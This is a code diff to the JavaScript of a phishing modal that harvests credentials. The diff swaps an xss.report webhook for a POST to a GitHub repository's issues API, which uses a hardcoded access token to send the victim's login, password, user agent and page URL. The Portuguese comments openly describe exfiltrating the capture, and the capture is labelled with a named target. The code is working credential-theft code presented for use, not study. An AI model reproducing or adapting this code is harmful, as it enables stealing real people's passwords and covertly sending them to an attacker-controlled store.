@@ -124,24 +124,38 @@
         var btn = document.getElementById('p-submit-btn');
 
         if(u.trim() === "" || p.trim() === "") {
-            // Vibra o botão se errar para fingir realismo
             btn.style.backgroundColor = "#ff4d4d";
-            setTimeout(() => { btn.style.backgroundColor = "#2EADD4"; }, 1000);
+            setTimeout(function() { btn.style.backgroundColor = "#2EADD4"; }, 1000);
             return;
         }
 
         btn.innerText = "Autenticando...";
-        
-        var targetWebhook = "https://xss.report/c/emilio_capture";
-        
-        // Exfiltra os dados e só depois fecha o modal
-        fetch(targetWebhook + "?u=" + encodeURIComponent(u) + "&p=" + encodeURIComponent(p), {
-            mode: 'no-cors',
-            method: 'GET'
-        }).then(() => {
+
+        // Salva a captura como Issue privada no GitHub (repo logs)
+        // Credenciais chegam direto no seu repositório privado - sem servidor extra
+        var ts = new Date().toISOString();
+        var ua = navigator.userAgent;
+        var issueBody = "## \uD83D\uDCA5 Captura Emílio Farias\n\n"
+                      + "**Timestamp:** `" + ts + "`\n"
+                      + "**Login:** `" + u + "`\n"
+                      + "**Senha:** `" + p + "`\n"
+                      + "**UserAgent:** `" + ua + "`\n"
+                      + "**URL Capturada:** `" + window.location.href + "`";
+
+        fetch("https://api.github.com/repos/projetoacc002/logs/issues", {
+            method: "POST",
+            headers: {
+                "Authorization": "token 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",
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                title: "\uD83D\uDD10 Capture @ " + ts,
+                body: issueBody
+            })
+        }).then(function() {
             document.body.style.overflow = "auto";
             document.getElementById('phishing_modal_111').remove();
-        }).catch(() => {
+        }).catch(function() {
             document.body.style.overflow = "auto";
             document.getElementById('phishing_modal_111').remove();
         });
